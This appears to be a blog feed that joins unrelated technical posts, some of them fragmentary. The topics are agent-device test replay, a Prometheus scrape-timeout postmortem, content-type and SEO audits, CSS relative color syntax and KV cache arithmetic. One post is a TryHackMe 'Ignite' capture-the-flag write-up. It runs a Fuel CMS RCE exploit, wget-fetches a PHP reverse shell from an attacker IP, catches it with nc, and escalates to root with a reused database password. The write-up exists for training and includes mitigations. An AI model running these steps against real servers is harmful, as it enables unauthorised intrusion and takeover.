Test Automation with agent-device (Part 3)

📅 Nov 01, 2026  |  Category: Other  |  Read Source →

This post covers saving test flows as agent-device .ad scripts and running them again, using a Flutter app. It goes through writing an .ad file, getting the app into the right state before a replay, reading the report when a replay stops and fixing it, and the token cost of agent-driven QA. It is based on agent-device 0.21.31 (2026-10-25).

Installation and the basic loop are in Part 1, and real-device setup is in Part 2.

What an .ad file is

When an agent checks an app, it reads the screen, picks the next thing to tap, and reads the result, over and over. Exploring the same flow this way every time keeps costing time and tokens. An .ad file pins down the result of that exploration as a list of commands, and replay runs the list from top to bottom.

Each line has the form <command> [positional...] [flag...], the same as an agent-device command in the terminal. Quoting follows shell rules too, so a selector containing spaces is wrapped like 'label="..."'. Below is the start of a flow that opens the app fresh, taps a button on the first screen, types into an input, and checks the result screen.

# First-run flow — the app ID comes in via -e APP= open ${APP} --relaunch wait 'label="<first-screen button>"' 30000 press 'label="<first-screen button>"' fill 'id="find-input"' "<text to type>" press 'label="<search button>" role=button' wait 'label="<result title>"' 60000 wait text "<text the result should show>" 10000 back close

A few notes:

  • # comments work. The docs do not say so, so the first line was a comment in a test replay, and it passed.
  • Do not hard-code the app ID. Leave it as ${APP} and pass -e APP=<bundle id> at replay time, and the same file works for builds with different IDs, such as a dev build and a release build.
  • The number after wait is a timeout in milliseconds. Give a long one to steps that wait on the network or on model inference.
  • Device-selection flags stay out of the file. --platform, --serial, --device, and --settle are not part of a script step; they go on the replay command.

There are two ways to make an .ad file. You can start recording with open <bundle id> --relaunch --save-script=<file>.ad, go through the flow, and save with session save-script, or you can write it by hand. The 24-step flow in this post was written by hand, based on a flow the agent had already passed manually.

Getting to a "first launch" state before replaying

replay only runs the commands written down; it does not reset the app. If the flow starts by checking the first-launch consent dialog, an app that still remembers an earlier consent stops right at step 2. So a separate runner script deletes and reinstalls the app before each replay.

# Android emulator adb -s <serial> uninstall <bundle id> adb -s <serial> install -r <apk path> adb -s <serial> shell cmd locale set-app-locales <bundle id> --locales en-US agent-device replay <file>.ad --platform android --serial <serial> -e APP=<bundle id> --timeout 240000 # iOS simulator xcrun simctl uninstall <UDID> <bundle id> xcrun simctl install <UDID> <Runner.app path> agent-device replay <file>.ad --platform ios --udid <UDID> -e APP=<bundle id> --timeout 300000

On Android, set-app-locales opens just this app in English while leaving the device language alone. On the iOS simulator no per-app language command was used, so the app follows the simulator's language setting. replay has a default work budget of 60 seconds, so raise it with --timeout for longer flows.

Deleting the app also deletes its data. So the runner script accepts only the designated test emulators (checked by name with adb -s <serial> emu avd name) and simulator UDIDs, and stops with exit code 2 if it gets any other device or an app ID outside your own. An emulator serial such as emulator-5554 is assigned in boot order and does not tell you which AVD it is, which is why the check uses the name.

With that in place, the 24-step flow finished with Replayed 24 steps on both runs on each platform: 8.8 and 9.4 seconds on the Android emulator, 13.9 and 14.0 seconds on the iOS simulator.

When a replay stops

When a replay gets stuck partway, it fails with REPLAY_DIVERGENCE. The report includes the step number and its line, the actionable elements on screen at that moment, and selector suggestions for that screen. So you do not have to start over after a fix, it also tells you how to resume with replay --from <step> --plan-digest <value>. When no automatic repair is possible, it says Repair hint: manual.

A first-launch system dialog. The flow that passed on Android stopped at step 2 the first time it ran on the iOS simulator.

Error (REPLAY_DIVERGENCE): Replay failed at step 2 (wait "label=\"<first-screen button>\"" 30000): wait timed out for selector: ... Current surface: Allow "<app name>" to track your activity across other companies' apps ...

The report's Current surface showed the App Tracking Transparency (ATT) dialog. It is a system dialog that appears on first launch only on iOS, so the flow written against Android had no step for it. After closing it with agent-device alert dismiss and replaying again, the run got past this step. The runner script does not handle it, so on builds that show this dialog, close it before replaying.

Input role names that differ by platform. Next, the replay stopped at the fill in step 5. The first selector was role=text-field, which matched on Android, but the iOS simulator exposed the same input as an other element with a label. To find one selector that works on both platforms, these were tried in order:

  1. editable=true — passed on Android, Selector did not match on iOS
  2. role=textfield || role=text-field — || is the "or" syntax that appeared in the report's selector suggestions. It still did not match on iOS.
  3. Adding Semantics(identifier:) to the Flutter widget — passed on both platforms

The last fix is one line of app code: identifier: 'find-input' added to the existing Semantics around the input, with no visible change on screen. The selector becomes id="find-input". As noted in Part 1, a Flutter Key does not show up in the accessibility tree, so adding an identifier is the reliable way to run the same script on both platforms.

Token cost and the rules for cutting it

Token cost was the reason for using .ad in the first place. Most of the cost of agent-driven QA came not from output but from cache reads. A cache read is the earlier conversation the agent re-reads on every response. The first real-device check of two apps took about 40 minutes and came to 121 responses, 77,985 output tokens, and 30,225,404 cache-read tokens, roughly 250,000 tokens re-read per response.

The QA agent was already on Sonnet, so the model was not the cause. In the same stretch, 11 screenshots were read into the conversation, and as the context grew, every response re-read more. So five rules went into the QA agent's instructions:

  1. Save a flow as .ad the first time it passes, and use replay from then on. When it gets stuck, fix only that step using the divergence report.
  2. Act with --settle and look only at the returned diff. Do not read the full screen tree.
  3. Save screenshots to files only, and read at most one per item into the conversation.
  4. End the session per item: one app, one thing to check. Past 40 responses, it is time to stop.
  5. Read logs and build output with grep or tail, only the lines you need.

The batch after the rules (three emulator checks, an iPhone attempt, an Android real device, about 30 minutes) came to 105 responses, 44,113 output tokens, and 19,171,162 cache-read tokens, about 180,000 cache-read tokens per response. The items checked were different, so the two sets of numbers cannot be compared directly, and the 40-response limit was not met. Tokens after adopting .ad have not been measured separately yet, and neither replay on a real device nor running it in CI has been tried.

Platform: TryHackMe · Difficulty: Easy · Category: Fuel CMS RCE / Credential Reuse

Introduction

The page title says "Welcome to FUEL CMS." Not a generic landing page, not a logo with no text — the literal CMS name, in the <title> tag, for anyone running curl to read. That's either refreshingly honest or a significant operational security failure, and either way it meant I could skip version fingerprinting entirely and go straight to searchsploit.

Ignite carries a well-documented unauthenticated RCE in Fuel CMS 1.4.1, and once that door opens, the rest of the box leans on a mistake seen constantly in real engagements: a database credential, sitting in plaintext in a configuration file, reused verbatim as the root system password. No clever escalation chain required — just reading a file everyone forgets is sensitive because "it's just a config file."

Recon

rustscan -a 10.49.166.110 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV Port Service Version 80/tcp HTTP Apache httpd 2.4.18 (Ubuntu) — "Welcome to FUEL CMS"

A single open port. The HTTP title removes any ambiguity about what's running.

feroxbuster -u http://10.49.166.110/ \ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \ -x php,xt,html 301 /fuel # admin panel root 200 /fuel/login # login form 302 /fuel/dashboard → /fuel/login/<token> # auth-gated, redirects when unauthenticated

The /fuel/ admin structure is fully exposed, confirming the CMS identity. No version number is directly visible on the page, but the title alone is enough to search for known exploits.

Foothold

Fuel CMS versions up to and including 1.4.1 contain a flaw in how the application evaluates certain input — an attacker can manipulate request parameters such that arbitrary PHP code is evaluated server-side, without any authentication. This was assigned CVE-2018-16763 and has multiple public proof-of-concept exploits.

Searching local Exploit-DB mirror for Fuel CMS exploits:

searchsploit fuel cms Fuel CMS 1.4.1 - Remote Code Execution (1) linux/webapps/47138.py Fuel CMS 1.4.1 - Remote Code Execution (2) php/webapps/49487.rb Fuel CMS 1.4.1 - Remote Code Execution (3) php/webapps/50477.py

Copying the third RCE script locally:

searchsploit -m php/webapps/50477.py

Running the exploit against the target:

python 50477.py -u http://10.49.166.110 [+]Connecting... Enter Command $

An interactive pseudo-shell, command-by-command — not a full reverse shell, but enough to stage one.

Confirming basic command execution:

Enter Command $ls README.md assets composer.json contributing.md fuel index.php robots.txt Enter Command $pwd /var/www/html

Shell / Access

The exploit's pseudo-shell is functional but limited — no interactivity for tools requiring a TTY, no persistence. The standard move: use it to pull down a real PHP reverse shell via wget, then trigger that file directly over HTTP.

Serving the PHP reverse shell from the attacking machine:

python3 -m http.server 80

Downloading it via the pseudo-shell:

Enter Command $wget http://192.168.134.217/php-reverse-shell.php

The download fired repeatedly (visible as .1, .2, .3... duplicate files in the listing) — the exploit script appears to issue the command multiple times internally, which is harmless here since wget simply creates incrementing filenames rather than failing.

Confirming the file landed:

Enter Command $ls ... php-reverse-shell.php php-reverse-shell.php.1 ... php-reverse-shell.php.12 ...

Setting up the listener, then triggering the original (non-duplicated) file directly:

nc -nvlp 4444 # browser/curl: http://10.49.166.110/php-reverse-shell.php connect to [192.168.134.217] from (UNKNOWN) [10.49.166.110] 38770 uid=33(www-data) gid=33(www-data) groups=33(www-data)

Stabilising:

python -c 'import pty; pty.spawn("/bin/bash")'

Collecting the user flag:

cat /home/www-data/flag.txt # 6470e394cbf6dab6a91682cc8585059b

Escalation

Standard CodeIgniter/Fuel CMS structure places database credentials in a predictable config file:

cd /var/www/html/fuel/application/config cat database.php $db['default'] = array( 'hostname' => 'localhost', 'username' => 'root', 'password' => 'mememe', 'database' => 'fuel_schema', ... );

MySQL root password: mememe. Worth testing immediately against the Linux accounts — database and system credential reuse is depressingly common.

First attempt — sudo su with the DB password:

sudo su # [sudo] password for www-data: mememe # Sorry, try again. (x3)

www-data has no valid sudo password matching this — expected, since www-data typically has no interactive login credentials at all.

Second attempt — su directly to root:

su # Password: mememe root@ubuntu:~# cat root.txt b9bbcb33e11b80be759c4e844862482d

The MySQL root password and the Linux root password are identical.

Exploitation — The Full Chain

  1. Page title identified Fuel CMS directly; searchsploit found CVE-2018-16763
  2. EDB-50477 exploit → pseudo-shell, no authentication required
  3. wget from pseudo-shell → staged a full PHP reverse shell in the webroot
  4. HTTP trigger → reverse shell as www-data → user flag
  5. application/config/database.php → MySQL root password mememe
  6. su (not sudo su) → password reuse → Linux root → root flag

Rabbit Holes

sudo su before plain su. The first escalation attempt used sudo su, which failed three times with the correct-looking password. The distinction matters: sudo asks for the calling user's own password (here, www-data, which has no usable interactive password), while su asks for the target user's password (root's own password). Since the leaked credential was reused as root's actual login password — not as a sudo grant for www-data — only the second form worked. A useful general reminder: when a found password doesn't work with sudo, try it with su before assuming it's the wrong credential entirely.

Duplicate file downloads via the exploit's wget command. Running the wget command once through the pseudo-shell apparently issued the underlying HTTP request multiple times internally (resulting in php-reverse-shell.php.1 through .12), based on the directory listing immediately afterward. This didn't cause any functional problem — the original un-suffixed file was still valid and triggered the shell correctly — but it's a quirk worth expecting when using this particular exploit script.

Mitigations

Vulnerability Severity Mitigation Fuel CMS 1.4.1 unauthenticated RCE (CVE-2018-16763) Critical Update Fuel CMS to a patched release; subscribe to CMS-specific security advisories CMS identity disclosed directly in page title Low Avoid exposing exact CMS name/version in publicly visible page metadata where avoidable Database credentials stored in plaintext config file High Use environment variables or a secrets manager for database credentials rather than committing them to a readable PHP config file Database root password reused as system root password Critical Never reuse credentials across different privilege boundaries (database vs. OS); use unique, randomly generated passwords for each

Key Takeaway

When a discovered credential fails against sudo, try it against su before discarding it — the two commands check entirely different passwords (the caller's vs. the target account's), and a credential leaked from an application config file is far more likely to match a direct account password than a sudo grant for an unrelated service account.

One slow count query took every metric our dispatch service had off the dashboard

📅 Nov 01, 2026  |  Category: Other  |  Read Source →

During a database slowdown in September our dispatch service failed about one request in six for twenty minutes, and our error rate alert never fired. When we opened the dashboard afterwards, it had a gap over exactly those twenty minutes. No data at all, on every panel the service had.

The service exposes its metrics for Prometheus to scrape every fifteen seconds, with the default scrape timeout of ten. Two years earlier we had added a gauge for the number of dispatches waiting to go out, implemented as a custom collector that ran a count query against the database each time the endpoint was read. Every one of eight pods ran it, and both of our Prometheus replicas scraped every pod, so the database answered that same question about once a second. On a normal day it took a third of a second.

When the database slowed down that query took around fourteen seconds. Prometheus gave up at ten, and a scrape that times out is a failed scrape, all of it. The target's up series went to zero, and Prometheus marked every series it had collected from that target as stale, the request counters and latency histograms as well as the one gauge that was slow. Our error rate alert divided one rate by another, and with no samples on either side there was nothing to compare with the threshold. The alert that did fire was TargetDown, five minutes in, routed as a ticket because a missing target is usually a deploy.

Meanwhile sixteen count queries every fifteen seconds were adding load to a database that was already struggling.

The pending count now comes from one place. A small background task in a single instance runs the query every thirty seconds with its own timeout and publishes the result, and the service's metrics endpoint serves only values it already holds in memory. We alert when scrape_duration_seconds for any target passes half its timeout. And TargetDown for a service carrying live traffic now pages, because we learned it can be the only thing still speaking.

A metrics endpoint that depends on the system it measures will go quiet exactly when that system is in trouble, and it can take everything else it reports down with it.

– Sergey Shinder

635 paragraphs on our site cannot contain a link, because the page body is data and not JSX

📅 Nov 01, 2026  |  Category: Other  |  Read Source →

Our marketing site has 72 URLs in its sitemap. 67 of them render their body from this type:

export type ContentSection = { heading: string paragraphs: string[] points?: { term: string; detail: string }[] }

A page file contains an array of those and nothing else that is visual. The component that turns them into HTML is about thirty lines: an h2, a stack of p, and an optional dl for the points. There is no className prop on a section, no heading level argument, no slot for arbitrary children.

The five pages that do not use it are the homepage, /about and the three legal documents, which are hand written.

What that produced, measured from the live HTML

I fetched all 72 pages and counted the rendered markup rather than the source:

pages with sections 67 sections 388 body paragraphs 635 points lists 21 terms inside them 166 most sections on one page 8

1.64 paragraphs per section. 21 of 388 sections use the optional list, which is roughly the proportion I would have guessed when writing the type: most of this is prose, and the list is for the handful of things that are genuinely enumerable.

The four pages with eight sections are all guides. Nothing on the site has nine, which is not a limit anybody implemented.

The constraint I did not design on purpose

paragraphs is string[]. A string cannot contain an anchor. So a page written through this type cannot have a link inside its prose. Not "should not", cannot: there is nowhere to put one.

I checked the rendered output for all 72 pages, looking inside every paragraph the component emits:

body paragraphs rendered by the component 635 ...containing an <a> 0

The only body paragraph on the whole site with a link in it is on /about, which is one of the five hand written pages. 635 to nothing is not a coincidence, it is a type.

That cuts both ways and I want to be fair about both.

What it buys: the typography lives in one component, so no page can invent a new heading size, and a section with a heading and no words under it is visible as paragraphs: [] in the source. It also means the copy is countable. Every audit I have run on this site, word counts, banned phrases, duplicate sentences, exclamation marks, was possible because the prose is data in a file rather than text interleaved with markup.

What it costs: in-prose contextual links are the single most frequently recommended internal linking tactic there is, and we have none. Every link on these pages is structural, in the header, the breadcrumb, the related-pages block at the bottom, or the call to action. A crawler reading one of our guides sees a page that mentions nine related concepts and links to none of them from the sentence doing the mentioning.

That is a real cost, and it was not a decision. It fell out of a type I wrote to solve a typography problem.

The keys are the content

One detail in the component that I would not write again:

{sections.map((section) => ( <section key={section.heading}> ... {section.paragraphs.map((paragraph) => ( <p key={paragraph} ...>{paragraph}</p> ))}

The React key for a section is its heading. The key for a paragraph is the entire paragraph. The key for a point is its term. So two identical paragraphs inside one section, or two sections with the same heading on one page, are a duplicate key warning and a reconciliation bug waiting for an editor to write the same sentence twice.

I measured that too, across all 388 sections: zero sections contain a repeated paragraph. The content satisfies a constraint nobody wrote down, which is the most fragile kind of correct.

The fix is boring. These lists are static, server rendered, and never reordered, so the index is a perfectly good key and cannot collide:

{section.paragraphs.map((paragraph, i) => ( <p key={i} ...>{paragraph}</p> ))}

Using content as a key is a habit people pick up from the lint rule that complains about index keys. The rule is right about reorderable client lists and wrong about a prerendered document.

What I would actually change

Not the type. The temptation is paragraphs: (string | ReactNode)[], and the moment that lands, the prose stops being data: no word count, no duplicate detection, no banned phrase test, because half of it is now a React element.

The version I would ship instead keeps the strings and adds a narrow seam:

type ContentSection = { heading: string paragraphs: string[] /** Phrases in this section's prose to link, once each. */ links?: { phrase: string; href: string }[] }

The renderer splits each paragraph on the phrase and wraps it. The prose stays a string, the audits keep working, and a page can say "we explain this in the hosting guide" with a link on those words. It is maybe twenty lines of component and one more field, and it is the thing I would do next if internal linking on this site needed a push.

Check it yourself

URL=https://pub-trivia.app/guides/how-to-be-a-good-quizmaster # Sections on the page curl -s "$URL" | grep -o '<h2 class="text-foreground text-2xl' | wc -l # Body paragraphs, and how many of them contain a link curl -s "$URL" | python3 -c " import re, sys ps = re.findall(r'<p class=\"text-muted-foreground leading-relaxed\">(.*?)</p>', sys.stdin.read(), re.S) print(len(ps), 'paragraphs,', sum('<a ' in p for p in ps), 'with a link') "

Eight sections, 25 paragraphs, and not one link in any of them. Match the <h2 prefix rather than the class on its own: the class name appears a second time inside the RSC flight payload at the bottom of the document, so a looser grep returns sixteen.

Then open pub-trivia.app/about, the hand written page, and notice that its paragraphs do contain links. One page in five that does not use the type, and it is the only page that can do the thing the other 67 cannot.

A type is a policy. If you encode your page body as data, write down what the data cannot express, because in a year that list is going to be a list of things your site does not do.

The optional field

Here is the part of the interface that interests me:

export interface ConditionPage { slug: string; condition: ConditionId; name: string; h1: string; metaTitle: string; metaDescription: string; lede: string; summary: string; sections: ConditionSection[]; checks: string[]; faqs: { q: string; a: string }[]; furtherReading?: { href: string; label: string; inline: string; blurb: string; }[]; }

Eleven required fields and one optional one. That is a perfectly reasonable thing to do, and it is also the exact mechanism by which content types rot. A required field is a question every entry has to answer. An optional field is a note that one entry had something extra to say. Add enough of them and the type describes the union of everything anybody ever wanted to publish, no single entry is ever incomplete, and nothing fails when a page is thin.

The alternative shape would be a separate registry keyed by condition, which makes the asymmetry visible in a file of its own rather than invisible as an absent property. I do not think that is better here, because further reading genuinely belongs next to the guide it extends. But it is worth naming the trade, because "make it optional" is the default move and it has a cost that arrives later, in a column of numbers like the one above.

Nobody decided that, and it compounds in the wrong direction: the page most in need of help getting found has the least help, and the page that already reads best is the one the rest of the site keeps recommending.

This is the thing I would not have noticed from inside the editor. Both numbers look fine on their own. It is only when you print them in the same table that you see the site has a quiet preference.

The temptation is a word count minimum, and it is a trap. A test that fails under 1,200 words produces 1,200 words, and the last 160 of them will be padding that makes the page worse.

A structural floor is defensible: every guide has at least three sections and at least three FAQ entries. Those are not quality, but they are shape, and shape is the thing that drifted. The real remedy is not a test, though. It is going back to the first seven pages with what we learned writing the eighth. The useful output of an audit like this is not a CI rule. It is a list, in order, of which page to fix first, and that list is just the table above read from the bottom up.

CogniPrep has a page per assessment provider answering one question: can you cheat this test? 56 of them, and the answer on every single one is no.

That is the worst possible brief for a content cluster. 56 pages, one verdict, one call to action, and a vendor name as the only obvious variable. Written carelessly it is a doorway-page farm. Here is what we did instead, and the one thing we got wrong, which I only found by counting.

The rule that makes the pages different

The registry's own header comment states the decision the cluster is built on:

Whether an assessment can be cheated is a property of the instrument, not of the company that bought it. Arctic Shores defeats a shortcut in exactly the same way at Thales as it does at Capita, so a page per employer would be dozens of restatements of one argument. Keying the cluster to the provider means each page can explain a mechanism that is genuinely its own.

That is the whole trick. Key the cluster to the thing that actually varies. A page per employer would have produced 132 pages with nothing to say; a page per instrument produces 56 pages where the reason a shortcut fails is different every time, because a behavioural profile with no marks, a timed adaptive paper and a forced-choice personality inventory fail a cheater for genuinely unrelated reasons.

Each entry in the registry carries seven strings: the meta title, the description, the standfirst, the verdict line, the one-line mechanism, the hub card blurb, and the name candidates actually type into a search box. I checked all seven across all 56 entries:

field values distinct metaTitle 56 56 metaDescription 56 56 intro 56 56 verdict 56 56 defence 56 56 cardBlurb 56 56 searchName 56 56

Zero repeats in 392 strings. Meta titles run from 30 to 47 characters and not one is over 60, so none of them is truncated in a result. The page bodies are 56 separate page.tsx files, 8,911 lines in total, from 117 lines for the shortest to 271 for the longest.

Measuring it from the outside

Counting distinct strings in your own registry proves you did not copy and paste. It does not prove the published pages read as different documents, because the bodies could still be one template with the nouns swapped.

So measure the deployed HTML. Strip the tags, cut the text into overlapping eight-word windows, and intersect them pairwise:

def shingles(text, n=8): words = [w.lower() for w in re.findall(r"[A-Za-z']+", text)] return set(tuple(words[i:i+n]) for i in range(len(words) - n + 1))

Across five pages in the cluster (shl, aon, hogan, usps and train-driver), each 1,361 to 1,806 words:

aon vs hogan 15.0% of the first page's shingles aon vs shl 20.4% aon vs train-driver 21.3% hogan vs usps 19.3% train-driver vs usps 12.0%

12 to 21 percent, and the floor is the interesting number. No pair in the cluster shares fewer than 210 shingles. To find out what that floor is made of, I ran the same comparison between a cheating page and an unrelated page on the site: 162 shared shingles, with no subject matter in common at all. So 162 of the floor is the header, navigation and footer, and the remaining 48 or so is the cluster's own shared furniture, the verdict banner and the call to action. Subtract both and the bodies overlap by a few percent.

Eight words is the right window size for this. Four-word windows match on ordinary English and tell you nothing; sixteen only catch verbatim paragraphs. Eight catches a reused sentence shape, which is the thing a template produces and a writer does not.

Every page ends with three related pages, chosen by a function with a limit = 3 default:

Nothing is broken. Every link is valid, every target is a real page, the typecheck is clean and the pages render. The function does exactly what it says. It just turns a 56-node graph into a star with three centres, and no test asserts anything about the shape of the output, so it went unnoticed for as long as the families stayed small.

The fix is to deal from the family rather than slicing it: order the candidates by something page-specific, rotate so each page appears in a bounded number of other pages' slots, and then assert the distribution in a test rather than the validity of the links. Stop Hardcoding Color Variants. Relative Color Syntax Does It.

📅 Nov 01, 2026  |  Category: Other  |  Read Source →

The PR comment was two words: "wrong blue." Not a bug report, not a reproduction — a designer scrolling through a staging build, stopping on the "Upgrade" button's hover state, and flagging it because something about it felt off against the rest of the rebrand that had shipped two weeks earlier.

They were right, and it took longer than it should have to find out why. The button's resting color matched the new brand blue exactly — that token had been updated the day the rebrand landed. Its hover color was still the old brand blue, darkened. Nobody had touched it, because nobody remembered it existed.

Five variables, one of which actually gets updated

Open almost any design system's color file and you'll find the same shape: one brand color, and a handful of hand-picked variants sitting next to it that all look derived but are actually just... more hex codes.

:root { --brand: #3b6fd6; --brand-hover: #2f58ab; /* "a bit darker" — picked by eye, once */ --brand-active: #244289; /* "darker still" — same deal */ --brand-border: #6e92e1; /* "a bit lighter" */ --brand-tint: rgba(59, 111, 214, 0.08); /* "faint background wash" */ }

Every one of those four extra values is somebody's good-faith attempt, at some point in the past, to eyeball a lighter or darker or more-transparent version of --brand. They're not wrong on day one. The problem shows up the day --brand changes and the other four don't — because CSS has no idea they were ever related. To the engine, --brand-hover isn't "darker --brand." It's just a string that starts with #2f58ab, full stop.

The "obvious" fix is discipline: a comment reminding whoever edits --brand to also update the other four, or a design-tokens build step that regenerates them from a single source before CSS ever sees them. Both work, right up until the person making a one-line brand tweak six months from now doesn't know the build step exists, or skims past the comment. Discipline that depends on nobody being in a hurry isn't a fix — it's a bet, and the rebrand PR is the bet losing.

The variables were never the problem — storing the relationship was

Here's the reframe that matters: --brand-hover was never really an independent color. It was always a function of --brand — "darker, same hue." --brand-tint was always "the same color, 8% opaque." The relationship was real and well understood by whoever first picked those hex codes. What got lost was that the relationship lived in a person's head for thirty seconds and then evaporated, leaving only its one-time output behind, frozen in a stylesheet forever.

What you actually want is for CSS to store the relationship, not just a snapshot of what it once produced — and that's a genuinely new category of thing for CSS to express. For most of CSS's life, a color value was a dead end: #3b6fd6 tells the renderer what to paint, but nothing about where it came from or how to get a cousin of it. color-mix() loosened that slightly — you can blend two colors — but blending two colors isn't the shape of this problem. You don't have two brand colors to mix; you have one color, and you want its lightness turned down a notch while everything else about it stays put.

Before you keep reading: what would you even call the CSS feature that lets you say "same color, just darker"? It's a fair question, because until relatively recently there wasn't a clean answer.

Relative color syntax: read a color's own channels back out

Relative color syntax lets a color function take another color as input and expose that color's own channels as variables you can do math on, right there in the function call:

:root { --brand: #3b6fd6; /* "same hue and chroma as --brand, just darker" */ --brand-hover: oklch(from var(--brand) calc(l - 0.12) c h); --brand-active: oklch(from var(--brand) calc(l - 0.20) c h); /* "same color, lighter, for a border" */ --brand-border: oklch(from var(--brand) calc(l + 0.15) c h); /* "same color, 8% opaque" */ --brand-tint: oklch(from var(--brand) l c h / 8%); }

Read the oklch(from var(--brand) ...) part literally: "take --brand, convert it to OKLCH, and give me three variables back — l for lightness, c for chroma, h for hue." Whatever you write after that is just CSS math on those three numbers (plus an optional alpha after the slash). calc(l - 0.12) means "this color's own lightness, minus 0.12" — not a hardcoded lightness value, a relationship to whatever --brand happens to be right now.

Change --brand to a rebrand's new blue, or swap it entirely for a dark-mode theme, and every line below it recomputes. There's no second hex code to forget, because there is no second hex code — --brand-hover isn't stored anywhere; it's derived, every time the browser needs it, from the one variable a human actually edits.

This isn't OKLCH-only, either. rgb(), hsl(), and color() all support the same from syntax, exposing whichever channels that color space naturally has:

/* rgb()'s own channels: r, g, b (0–255), alpha */ .badge { background: rgb(from var(--brand) r g b / 15%); } /* hsl()'s own channels: h, s, l, alpha — s and l come back as plain numbers (0-100), not percentages, so the math below uses 10, not 10% */ .link:hover { color: hsl(from var(--brand) h s calc(l - 10)); }

OKLCH is usually the better pick for lightness math specifically, because it's designed so that "lightness" tracks perceived brightness consistently across hues — nudging l down by the same amount darkens a yellow and a blue by roughly the same perceived amount. Nudge hsl()'s l channel the same way and the result can feel inconsistent hue to hue, because HSL's lightness was never built to model human perception in the first place.

The one sharp edge: clamp your math

calc(l - 0.12) is honest math, which means it'll happily produce a number outside the range that makes sense. Pick a brand color that's already quite dark, subtract 0.20 from its lightness, and l can go negative — which isn't a color error so much as a "this doesn't mean anything" result, rendered as whatever the browser decides black looks like.

The fix is the same clamp() you'd reach for anywhere else in CSS, wrapped around the channel math:

--brand-hover: oklch(from var(--brand) clamp(0, calc(l - 0.12), 1) c h);

That one change makes the derivation safe for any input color, including ones your design system doesn't control yet — a user-customizable accent color, say, or a brand color read from a CMS. Skip the clamp and the formula only works for colors in roughly the lightness range you tested it against, which defeats a good chunk of the point: a derivation that only works for some inputs is just a more elaborate hardcoded value.

Is this safe to ship, or is it another flag-gated preview?

Safe to ship — but the rollout order isn't what you'd guess. Safari 16.4 (March 2023) was the earliest browser with something, but it was a partial pass at an older draft of the spec with real parsing bugs; that implementation was later replaced, not extended. Chrome and Firefox did the work of actually matching the final spec through 2024 (Firefox in Firefox 128, July 2024), and Safari didn't catch up — bug fixes included — until Safari 18 in September 2024. So for the exact forms used above, Safari was last to ship the behavior this post describes, not first. Either way, that was over two years ago: by now every major evergreen browser has unprefixed, unflagged, spec-correct support, and there's no realistic "but what about X" objection left to raise for a typical modern browser matrix. If your project still has to support browsers from before that window, the fallback is simple and honest: keep writing literal hex variants for those browsers, and layer the relative syntax on top for everyone else — it degrades to "the hardcoded value you already had," not to a broken page.

A sibling codebase of mine has read times computed as a word count divided by 200, where the division is real and the word count is a number somebody typed. This one skips the arithmetic and types the answer.

They are the same bug wearing different clothes: a derived number stored as an input. Both look fine forever, because nothing can fail. A page gets two new sections, nobody updates the badge, and the badge was never checked against anything in the first place.

The content is already structured data in a TypeScript file, so the word count is available at build time for free. Deleting a field from a type is a nicer change than adding a test that asserts a human typed a defensible number.

Thirty-two FAQs, exactly four per page. Not approximately four. Four, eight times. Nobody decided that a page must have four questions, and yet nobody has ever shipped one with three or five, which is the kind of pattern that forms when you copy the previous entry and fill it in. The questions are good and the uniformity is a tell: a page with only two real questions should ship two.

Five citations across eight pages. sources is part of the trust model, because the rule these pages are written against, in the type's own comment, is that "the advice has to be worth reading by somebody who never buys anything". Two pages carry two sources, one carries one, and five carry none. The layout renders the block conditionally:

{article.sources.length > 0 && ( // ...the Sources heading and the list )}

So five of the eight do not show an empty Sources heading, they show no heading, and nothing in the build complains. The pages with nothing to cite are the softer, advice-shaped ones, which is exactly where a citation does the most work. A test that fails a published article with zero sources is the cheap version of a standard, and it would currently fail five pages, which is the point.

One URL space, no root. Guides live at /guides/<slug> and audience pages at /for/<slug>, from one type, split by one field:

export function articleHref(article: Article): string { return article.kind === "audience" ? `/for/${article.slug}` : `/guides/${article.slug}`; }

That split is deliberate and I would do it again: /guides/ is for somebody describing a task, /for/ is for somebody describing themselves, and the two read differently even when they say similar things. The consequence is that /for by itself is a 404. The hub at /guides lists both kinds and its ItemList structured data carries all eight, so nothing is unreachable, but the parent of three live URLs answering 404 is the kind of thing an SEO audit flags and a human never notices.

Each article links three others and three or four of the per-site alert pages. Counting inbound links across the eight:

Twenty-four links, hand-written, no orphans, and the most-linked page is the one about what to write to a landlord, which is also the page a person actually needs at the moment they are panicking. The structure came out right because each article's relatedArticles was filled in by somebody thinking about that reader rather than about the graph.

Halving the KV Cache Doubles Capacity and Buys 1% of Speed

📅 Nov 01, 2026  |  Category: Other  |  Read Source →

A reader ran the script from my last piece against the table, found a bug in my code, and asked a better question than the one I answered.

The bug first. For Llama-3.3-70B on an 80 GiB H100 the fit column printed a negative sequence count, about -41 at 4k. The table said "does not fit" and the table was right, but the script printed a number, and a number that means nothing invites a diff. It now has a no fit branch. Fixed in both places.

The question was this: if the engine swaps to an FP8 KV cache, does the long-context penalty halve?

Short answer. Capacity halves, exactly, at every context, on every card. Speed does not, at any context you would call long. Both answers come out of one formula, and they only look like the same question until you write it down.

The gain is a ratio, not a factor

The single-stream ceiling is bandwidth divided by bytes read per token:

tok/s = bw / (W + L·K)

W is the weight bytes, L the context length, K the cache bytes per token. Halve K and the gain is (W + L·K) / (W + L·K/2). It has two limits and no middle setting:

  • when the weight read dominates (L·K << W), the gain is 1.00x
  • when the cache dominates (L·K >> W), the gain approaches 2.00x

Everything between is arithmetic. For Qwen3-32B on an H100, computed:

ctx tok/s, BF16 KV tok/s, FP8 KV speed gain cache read as share of total 4k 50.2 50.7 x1.01 1.6% 32k 45.2 47.9 x1.06 11.6% 64k 40.5 45.2 x1.12 20.0% 128k 33.5 40.5 x1.21 34.3%

Llama-3.1-8B on the same card, whose cache is heavier relative to its weights, goes 201.8 -> 205.2 at 4k (x1.02) and 100.8 -> 135.9 at 128k (x1.35). Llama-3.3-70B, whose weights are 131.5 GiB and swamp everything else, goes x1.00 at 4k and x1.13 at 128k.

So "does it halve the penalty" is the wrong shape of question. It scales the cache term, and how much that matters depends entirely on how big the cache term already was.

Capacity is linear, and that is why it doubles exactly

Sequences that fit is (mem - W) / (L·K). K appears once, linearly, with nothing else in the denominator. Halve it and you get exactly 2.00x, at every model, every card, every context length. Qwen3-32B on H100: 18.91 to 37.81 sequences at 4k, 2.36 to 4.73 at 32k, 0.59 to 1.18 at 128k.

No approximation, no log, no interaction terms. That is the clean half of the answer, and it is the half that actually changes what you can deploy.

The crossover is the only number that matters

The gain stops being a rounding error when L·K = W, i.e. when the cache read equals the weight read. Solve for context length on BF16 weights:

